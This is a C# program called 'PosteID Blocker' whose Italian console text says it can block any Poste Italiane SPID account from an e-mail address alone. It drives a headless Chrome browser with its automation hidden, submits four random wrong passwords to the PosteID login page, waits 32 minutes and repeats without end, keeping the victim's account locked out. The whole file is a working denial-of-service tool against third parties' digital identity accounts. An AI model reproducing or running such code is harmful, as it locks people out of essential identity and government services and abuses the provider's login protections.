using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenQA;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;

namespace PosteIDBlocker
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "PosteID Blocker";
            Console.WriteLine(@"

  _____   ____   _____ _______ ______ _____ _____  
 |  __ \ / __ \ / ____|__   __|  ____|_   _|  __ \ 
 | |__) | |  | | (___    | |  | |__    | | | |  | |
 |  ___/| |  | |\___ \   | |  |  __|   | | | |  | |
 | |    | |__| |____) |  | |  | |____ _| |_| |__| |
 |_|__  _\____/|_____/___|_|_ |______|_____|_____/ 
 |  _ \| |    / __ \ / ____| |/ /  ____|  __ \     
 | |_) | |   | |  | | |    | ' /| |__  | |__) |    
 |  _ <| |   | |  | | |    |  < |  __| |  _  /     
 | |_) | |___| |__| | |____| . \| |____| | \ \     
 |____/|______\____/ \_____|_|\_\______|_|  \_\    
                                                   
                                                   

");
            string username = "";

            Console.WriteLine("[!] Benvenuto in PosteID Blocker! Con questo programma riuscirai a bloccare qualsiasi account di Poste Italiane SPID mediante l'indirizzo e-mail.");
            Console.Write("\r\n[!] Per favore, inserisci l'indirizzo e-mail da bloccare qui di fianco: ");

            while (true)
            {
                username = Console.ReadLine();

                if (!IsEmailValid(username))
                {
                    Console.Write("[!] L'indirizzo e-mail che hai inserito non è correttamente formattato. Per favore, re-inserisci: ");
                }
                else
                {
                    break;
                }
            }

            Console.WriteLine("[!] Sto bloccando l'utente che ha indirizzo e-mail '" + username + "'.");

            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.EnableVerboseLogging = false;
            service.SuppressInitialDiagnosticInformation = true;
            service.HideCommandPromptWindow = true;

            ChromeOptions options = new ChromeOptions();

            options.PageLoadStrategy = PageLoadStrategy.Normal;

            options.AddArgument("--window-size=1920,1080");
            options.AddArgument("--no-sandbox");
            options.AddArgument("--headless");
            options.AddArgument("--disable-gpu");
            options.AddArgument("--disable-crash-reporter");
            options.AddArgument("--disable-extensions");
            options.AddArgument("--disable-in-process-stack-traces");
            options.AddArgument("--disable-logging");
            options.AddArgument("--disable-dev-shm-usage");
            options.AddArgument("--log-level=3");
            options.AddArgument("--output=/dev/null");
            options.AddArgument("--disable-blink-features=AutomationControlled");
            options.AddArgument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36");
            options.AddArgument("--sec-ch-ua=\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Google Chrome\";v=\"101\"");

            ChromeDriver driver = new ChromeDriver(service, options);

            while (true)
            {
                Console.WriteLine("[!] Sto bloccando l'utente.");

                for (int i = 0; i < 4; i++)
                {
                    driver.Navigate().GoToUrl("https://posteid.poste.it/jod-securelogin-schema/login-authentication-failed.jsp");
                    string password = new ProtoRandom.ProtoRandom(100).GetRandomString("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#", 16);
                    IWebElement usernameElement = null, passwordElement = null, buttonElement = null;

                    while (usernameElement == null)
                    {
                        try
                        {
                            usernameElement = (IWebElement)driver.ExecuteScript("return document.getElementById(\"username\");");
                        }
                        catch
                        {

                        }
                    }

                    while (passwordElement == null)
                    {
                        try
                        {
                            passwordElement = (IWebElement)driver.ExecuteScript("return document.getElementById(\"password\");");
                        }
                        catch
                        {

                        }
                    }

                    while (buttonElement == null)
                    {
                        try
                        {
                            buttonElement = (IWebElement)driver.ExecuteScript("var aTags = document.getElementsByTagName(\"button\"); var searchText = \"Accedi\"; for (var i = 0; i < aTags.length; i++) { if (aTags[i].textContent == searchText) { return aTags[i];}}");
                        }
                        catch
                        {

                        }
                    }

                    usernameElement.SendKeys(username);
                    passwordElement.SendKeys(password);

                    bool condition = false;

                    while (!condition)
                    {
                        try
                        {
                            condition = (bool)driver.ExecuteScript("return document.getElementById(\"username\").value == '" + username + "' && document.getElementById(\"password\").value == '" + password + "';");
                        }
                        catch
                        {

                        }
                    }

                    buttonElement.Click();
                }

                Console.WriteLine("[!] Utente bloccato. Attendo 32 minuti.");
                Thread.Sleep(60000 * 32);
            }
        }

        public static bool IsEmailValid(string email)
        {
            var trimmedEmail = email.Trim();

            if (trimmedEmail.EndsWith("."))
            {
                return false;
            }
            try
            {
                var addr = new System.Net.Mail.MailAddress(email);
                return addr.Address == trimmedEmail;
            }
            catch
            {
                return false;
            }
        }
    }
}
